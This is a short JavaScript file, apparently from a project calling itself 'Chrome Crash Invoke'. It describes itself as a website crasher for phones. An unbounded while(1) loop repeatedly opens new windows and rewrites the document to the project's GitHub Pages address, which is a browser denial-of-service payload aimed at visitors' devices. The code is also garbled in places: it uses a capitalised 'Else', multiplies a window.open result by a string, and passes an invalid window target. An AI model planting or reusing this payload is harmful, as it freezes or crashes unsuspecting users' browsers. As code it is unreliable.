 /*
*   Owner: Chrome Crash Invoke
*   Date Created: 11/15/2021
 */

// Functions For Loop
$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
$vwer = '#';
$x = Math.floor((Math.random() * 10000000000000000000) + 1);

while(1) {
    
    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
    /* (Website Crasher For IOS and android And Mostly Every Phone) */
        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
        // if window.open fails.
        document.open('#' + $x);
        // When Function window.open does it's thing, history back will reset the website.

    } Else {
        
        /* (This Will NOT Crash A Computer Or Cause Most Harm) */
        document.open('#' + $x);
        
        // if (Document.open()) Fails.
        let newTab = window.open();
        newTab.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/' + $x;
        
    }
}
